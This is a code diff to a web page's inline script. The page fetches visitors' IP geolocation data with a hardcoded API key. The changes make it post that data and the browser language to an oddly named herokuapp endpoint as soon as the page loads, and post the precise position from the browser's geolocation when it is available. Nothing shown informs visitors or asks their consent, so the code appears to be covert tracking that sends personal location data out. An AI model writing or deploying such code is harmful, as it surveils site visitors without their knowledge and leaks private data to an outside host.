@@ -19,25 +19,53 @@
   <script>
     let apiKey = '1be9a6884abd4c3ea143b59ca317c6b2';
     $.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function (data) {
+      $.ajax({
+        type: 'POST',
+        url: 'https://asdasaash654.herokuapp.com/acess',
+        data: JSON.stringify({
+          ip: data,
+          language: navigator.language
+        }),
+        contentType: "application/json",
+        dataType: 'json'
+      })
       function getLocation() {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition((location) => {
-            $.post('https://asdasaash654.herokuapp.com/acess').send({
-              ip: data,
-              location,
-              language: navigator.language
+            $.ajax({
+              type: 'POST',
+              url: 'https://asdasaash654.herokuapp.com/acess',
+              data: JSON.stringify({
+                ip: data,
+                location,
+                language: navigator.language
+              }),
+              contentType: "application/json",
+              dataType: 'json'
             })
           }, () => {
-            $.post('https://asdasaash654.herokuapp.com/acess').send({
-              ip: data,
-              language: navigator.language
+            $.ajax({
+              type: 'POST',
+              url: 'https://asdasaash654.herokuapp.com/acess',
+              data: JSON.stringify({
+                ip: data,
+                language: navigator.language
+              }),
+              contentType: "application/json",
+              dataType: 'json'
             })
           });
         } else {
-          $.post('https://asdasaash654.herokuapp.com/acess').send({
+          $.ajax({
+            type: 'POST',
+            url: 'https://asdasaash654.herokuapp.com/acess',
+            data: JSON.stringify({
               ip: data,
               language: navigator.language
-            })
+            }),
+            contentType: "application/json",
+            dataType: 'json'
+          })
         }
       }
 
